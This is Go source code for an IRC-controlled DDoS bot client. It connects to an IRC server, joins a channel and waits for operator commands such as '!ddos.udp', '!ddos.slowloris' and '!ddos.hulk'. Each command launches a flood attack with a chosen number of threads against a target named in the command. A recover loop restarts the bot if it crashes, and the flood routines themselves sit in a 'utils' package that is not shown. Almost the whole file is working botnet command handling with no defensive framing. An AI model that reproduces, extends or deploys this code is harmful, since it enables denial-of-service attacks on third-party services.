package main

import (
	"bufio"
	"net"
	"net/textproto"
	"strconv"
	"os"
	"strings"
	"utils"
)

func NeverExit(f func()) {
	defer func() {
		if v := recover(); v != nil {
			go NeverExit(f)
		}
	}()
	f()
}

func notexit() {
	for {
		server := "127.0.0.1:6667"
	CONNS:
		connection, err := net.Dial("tcp", server)
		if err != nil {
			goto CONNS
		}
		connection.Write([]byte("NICK Fuck|" + utils.RandomString(5, false) + "|\r\n"))
		connection.Write([]byte("USER buntu buntu buntu :The BuntuNet\r\n"))
		defer connection.Close()

		reader := bufio.NewReader(connection)
		tp := textproto.NewReader(reader)

		for {
			line, err := tp.ReadLine()
			if err != nil {
				goto CONNS
			}
			if strings.Contains(line, "PING") {
				pongresponse := "PONG :" + strings.Split(line, ":")[1] + "\r\n"
				connection.Write([]byte(pongresponse))
			}
			if strings.Contains(line, "001") {
				connection.Write([]byte("JOIN #Godbuntu\r\n"))
			}
			if strings.Contains(line, "!ddos.stop") {
				utils.SetDDoSMode(false)
			}
			if strings.Contains(line, "!ddos.get") {
				threads, errt := strconv.Atoi(strings.Split(line, " ")[5])
				if errt != nil {
					continue
				}
				interval, erri := strconv.Atoi(strings.Split(line, " ")[6])
				if erri != nil {
					continue
				}
				utils.DDosAttc("0", strings.Split(line, " ")[4], threads, interval)
			}
			if strings.Contains(line, "!ddos.post") {
				threads, errt := strconv.Atoi(strings.Split(line, " ")[5])
				if errt != nil {
					continue
				}
				interval, erri := strconv.Atoi(strings.Split(line, " ")[6])
				if erri != nil {
					continue
				}
				utils.DDosAttc("6", strings.Split(line, " ")[4], threads, interval)
			}
			if strings.Contains(line, "!ddos.hulk") {
				threads, errt := strconv.Atoi(strings.Split(line, " ")[5])
				if errt != nil {
					continue
				}
				interval, erri := strconv.Atoi(strings.Split(line, " ")[6])
				if erri != nil {
					continue
				}
				utils.DDosAttc("1", strings.Split(line, " ")[4], threads, interval)
			}
			if strings.Contains(line, "!ddos.slowloris") {
				threads, errt := strconv.Atoi(strings.Split(line, " ")[5])
				if errt != nil {
					continue
				}
				interval, erri := strconv.Atoi(strings.Split(line, " ")[6])
				if erri != nil {
					continue
				}
				utils.DDosAttc("2", strings.Split(line, " ")[4], threads, interval)
			}
			if strings.Contains(line, "!ddos.udp") {
				threads, errt := strconv.Atoi(strings.Split(line, " ")[5])
				if errt != nil {
					continue
				}
				interval, erri := strconv.Atoi(strings.Split(line, " ")[6])
				if erri != nil {
					continue
				}
				utils.DDosAttc("3", strings.Split(line, " ")[4], threads, interval)
			}
			if strings.Contains(line, "!ddos.tcp") {
				threads, errt := strconv.Atoi(strings.Split(line, " ")[5])
				if errt != nil {
					continue
				}
				interval, erri := strconv.Atoi(strings.Split(line, " ")[6])
				if erri != nil {
					continue
				}
				utils.DDosAttc("4", strings.Split(line, " ")[4], threads, interval)
			}
			if strings.Contains(line, "!ddos.geye") {
				threads, errt := strconv.Atoi(strings.Split(line, " ")[5])
				if errt != nil {
					continue
				}
				interval, erri := strconv.Atoi(strings.Split(line, " ")[6])
				if erri != nil {
					continue
				}
				utils.DDosAttc("5", strings.Split(line, " ")[4], threads, interval)
			}
			if strings.Contains(line, "!kill") {
				os.Exit(3)
			}
		}
	}
}

func main() {
	go NeverExit(notexit)
	select{}
}
